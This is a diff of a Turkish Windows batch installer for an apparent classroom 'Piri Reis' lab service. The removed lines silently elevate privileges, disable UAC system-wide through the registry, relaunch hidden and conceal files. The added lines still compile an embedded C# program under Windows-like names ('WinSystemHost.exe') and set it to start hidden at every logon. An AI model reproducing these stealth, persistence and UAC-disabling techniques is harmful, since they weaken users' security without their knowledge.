@@ -1,94 +1,63 @@
-﻿@echo off
+@echo off
 chcp 65001 >nul
+title Piri Reis Laboratuvar Servisi Kurulumu
+
 set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-:: 1. Yonetici yetkisi kontrolu (UAC ve sessiz kurulumlar icin gereklidir)
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    if not "%~1"=="--silent" (
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c `"%~f0`" %*' -Verb RunAs"
-        exit /b 0
-    )
-)
-
-:: 2. UAC promptlarini kapat ve tum arka plan yuklemelerine sessiz izin ver
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
-
-:: 3. Kullanici cift tikladiginda CMD penceresini aninda kapatip gizli moda gec
-if not "%~1"=="--silent" (
-    attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
-    copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
-    (
-        echo Set WshShell = CreateObject^("WScript.Shell"^)
-        echo WshShell.Run chr^(34^) ^& "%INSTALL_DIR%\setup_runner.bat" ^& chr^(34^) ^& " --silent " ^& chr^(34^) ^& "%~f0" ^& chr^(34^), 0, False
-    ) > "%INSTALL_DIR%\launch_silent.vbs"
-    start "" wscript.exe //B //Nologo "%INSTALL_DIR%\launch_silent.vbs"
-    exit /b 0
-)
-
-:: 4. Masaustundeki gecici kurulum dosyalarini temizle
-if not "%~2"=="" (
-    if /i not "%~2"=="%INSTALL_DIR%\setup_runner.bat" (
-        del /f /q "%~2" >nul 2>&1
-    )
-)
-del /f /q "%USERPROFILE%\Desktop\Lab Ekran Paylasimi.lnk" >nul 2>&1
-del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
-del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
-del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1
-
-:: 5. Calisan eski surecleri sonlandir
+:: Eski surecleri temizle
 taskkill /f /im WinSystemHost.exe >nul 2>&1
 taskkill /f /im WinSystemGuard.exe >nul 2>&1
 taskkill /f /im PiriReisLabHost.exe >nul 2>&1
-taskkill /f /im PiriReisLabGuard.exe >nul 2>&1
-taskkill /f /im WindowsAudioHost.exe >nul 2>&1
 
-set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
-if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1
-
+:: C# Kaynak kodunu ayikla
 set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
 set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
 set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"
 
-del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
-schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1
+:: C# kodunu dosyanin sonundan cikar (60. satirdan itibaren)
+more +60 "%~f0" > "%CS_FILE%"
 
-:: 6. C# Kaynak Kodunu Cikar (90. satirdan itibaren)
-more +90 "%~f0" > "%CS_FILE%"
-
+:: Derleyiciyi bul ve derle
 set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 
-attrib -h -s "%EXE_FILE%" >nul 2>&1
-attrib -h -s "%GUARD_FILE%" >nul 2>&1
 "%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1
 
-attrib -h -s "%VBS_STARTUP%" >nul 2>&1
+:: Guard kopyasini olustur
+copy /y "%EXE_FILE%" "%GUARD_FILE%" >nul 2>&1
+
+:: Otomatik baslangic VBS betigini olustur (Sessiz arka plan calistiricisi)
 (
-echo Set WshShell = CreateObject^("WScript.Shell"^)
-echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
+    echo Set WshShell = CreateObject^("WScript.Shell"^)
+    echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
 ) > "%VBS_STARTUP%"
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo "%VBS_STARTUP%"" /f >nul 2>&1
-schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo "%VBS_STARTUP%"" /sc onlogon /rl HIGHEST /f >nul 2>&1
+:: Kayit defterine baslangic kaydini ekle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
 
-del /f /q "%CS_FILE%" >nul 2>&1
-del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
-attrib +h "%VBS_STARTUP%" >nul 2>&1
-attrib +h +s "%EXE_FILE%" >nul 2>&1
-attrib +h +s "%INSTALL_DIR%" >nul 2>&1
-
+:: Servisi simdi arka planda baslat
 start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
-del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
+
+:: Gecici CS dosyasini temizle
+del /f /q "%CS_FILE%" >nul 2>&1
+
+echo.
+echo =======================================================
+echo  [OK] Piri Reis Lab Servisi Basariyla Kuruldu!
+echo  [OK] Servis su an arka planda calisiyor.
+echo  [OK] Bilgisayar her acildiginda otomatik baslayacaktir.
+echo =======================================================
+echo.
+timeout /t 3 >nul
 exit /b 0
 
+::
+::
+::
+::
 using System.Collections.Generic;
 
 using System;
